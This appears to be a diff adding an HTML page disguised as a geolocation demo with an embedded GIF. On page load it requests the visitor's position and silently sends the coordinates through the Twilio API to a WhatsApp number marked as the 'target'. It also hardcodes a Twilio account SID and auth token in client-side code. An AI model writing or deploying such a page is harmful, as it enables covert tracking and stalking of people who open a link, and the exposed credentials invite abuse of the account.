@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()">
+<iframe src="https://giphy.com/embed/NWg7M1VlT101W" width="480" height="269" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/disney-bored-tired-NWg7M1VlT101W"></a></p>
+<h1>HTML Geolocation</h1>
+<p>Click the button to get your coordinates.</p>
+
+<button onclick="getLocation()">Try It</button>
+
+<p id="demo"></p>
+
+<script>
+const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(handleSuccess, handleError);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function handleSuccess(position) {
+  const location = "Latitude: " + position.coords.latitude + 
+    "<br>Longitude: " + position.coords.longitude;
+  x.innerHTML = location;
+  sendLocation(location);
+}
+
+function handleError() {
+  const errorMsg = "Sorry, no position available.";
+  x.innerHTML = errorMsg;
+  alert(errorMsg);
+  sendLocation(errorMsg);
+}
+
+function sendLocation(message) {
+  const accountSid = 'ACa19fba622d6c5fe27c95c975015c1109';
+  const authToken = '3aafe850507f6882ebef314ba5c402ad';
+  const twilioNumber = 'whatsapp:+14155238886'; // Twilio sandbox number
+  const recipientNumber = 'whatsapp:+254710745780'; // Your target number
+
+  fetch(`https://api.twilio.com/2010-04-01/Accounts/${accountSid}/Messages.json`, {
+    method: 'POST',
+    headers: {
+      'Authorization': 'Basic ' + btoa(`${accountSid}:${authToken}`),
+      'Content-Type': 'application/x-www-form-urlencoded',
+    },
+    body: new URLSearchParams({
+      From: twilioNumber,
+      To: recipientNumber,
+      Body: message
+    })
+  })
+  .then(response => response.json())
+  .catch(error => console.error('Error:', error));
+}
+</script>
+
+</body>
+</html>
